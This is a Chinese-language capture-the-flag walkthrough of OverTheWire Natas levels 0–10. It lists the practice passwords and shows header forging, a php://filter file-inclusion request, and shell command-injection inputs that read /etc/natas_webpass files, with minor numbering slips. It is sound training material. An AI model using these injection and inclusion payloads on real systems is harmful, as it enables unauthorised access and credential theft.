[Natas](http://overthewire.org/wargames/natas/)

1、
http://natas0.natas.labs.overthewire.org/
输入账号密码登录后，查看源代码：
The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto

2、
http://natas1.natas.labs.overthewire.org/
同样查看源代码：
The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

3、
http://natas2.natas.labs.overthewire.org/
查看源码：
发现有个图片，还有个目录files
**敏感目录很重要**
打开后发现两个文件
点击users.txt得到密码：
```
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

4、
http://natas3.natas.labs.overthewire.org/
提示：
Not even Google will find it this time
联想robots.txt,网站通过robots协议告诉搜索引擎哪些页面可以爬取。
谷歌不能爬取，证明robots中定义了不能爬取

打开robots.txt

Disallow: /s3cr3t/

访问：
打开users.txt
发现：
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

5、
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
提示Referer头
请求头中加入：
Referer:http://natas5.natas.labs.overthewire.org/
结果：
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

6、
访问发现响应头中有：
Set-Cookie: loggedin=0
且响应Body中显示没登录
证明登不登录是根据cookie设置的（不安全）
请求头中加入
Cookie:loggedin=1
结果：
The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
7、
登录，有一个输入框，查看源码：
```
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
```

发现敏感文件
includes/secret.inc
打开后出现secret
FOEIUWGHFEEUHOFUOIU
输入框中输入后出现密码：
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
告诉我们别把敏感信息放在用户可以访问的页面


7.
查看源代码：

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

证明要访问指定文件

源文件中还有两行有意思的代码：
```
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
```
证明可能存在文件包含
http://natas7.natas.labs.overthewire.org/index.php?page=php://filter/read=convert.base64-encode/resource=/etc/natas_webpass/natas8
得到密码：

REJmVUJmcVFHNjlLdkp2SjFpQWJNb0lwd1NOUTliV2UK 

再base64解密得到密码：
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 
 8.
 输入框，同样查看源代码：
 ```
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
 ```
 解密3d3d516343746d4d6d6c315669563362后得到
 oubWYf2kBq
 
 输入secret得到密码：
 The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 

 9.
 同样是代码审计：
 <pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

命令执行漏洞

flag;cat /etc/natas_webpass/natas9 && file
得到密码:
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

10.
For security reasons, we now filter on certain characters
提示过滤了一些字符串
```
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
看来不能使用;|&

grep 可以在多个文件中搜搜，所以可以使用命令
grep -i '' /etc/natas_webpass/natas11 dictionary.txt
'' /etc/natas_webpass/natas11
即填入：

最后得到密码：U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

11.

